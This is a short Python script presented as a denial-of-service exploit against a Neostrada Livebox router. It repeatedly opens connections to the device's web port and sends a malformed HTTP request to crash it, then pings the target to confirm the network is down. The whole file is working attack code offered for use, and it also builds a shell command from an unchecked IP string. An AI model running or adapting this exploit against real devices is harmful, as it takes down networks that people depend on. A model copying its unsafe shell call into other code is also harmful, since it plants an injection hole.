#!/usr/bin/python

from socket import *
import os
import sys
target = "192.168.1.1"
def to_vuln(ip):
        suck = socket(AF_INET,SOCK_STREAM,0)
        try:
                conn = suck.connect((ip,80))
        except Exception:
                check(ip)
        return suck
def check(ip):
        print "[+] No HTTP response..."
        print "[+] Server and network should go down!"
        print "[+] Check it with ping..."
        os.system("ping "+ip)
i=0
print "[!] Neostrada Livebox Remote Network Down Exploit!!"
print "[!]              [HTTP DoS vuln]           "
print "[!]      by 0in [0in.email(at)gmail.com]           "
print "\n[+] Dosing..."
for i in range(256):
        pack3t = "GET /- HTTP/1.1\r\n\r\n"
        POC = to_vuln(target)
        POC.send(pack3t)
        try:
                POC.recv(512)
        except Exception:
                check(target)
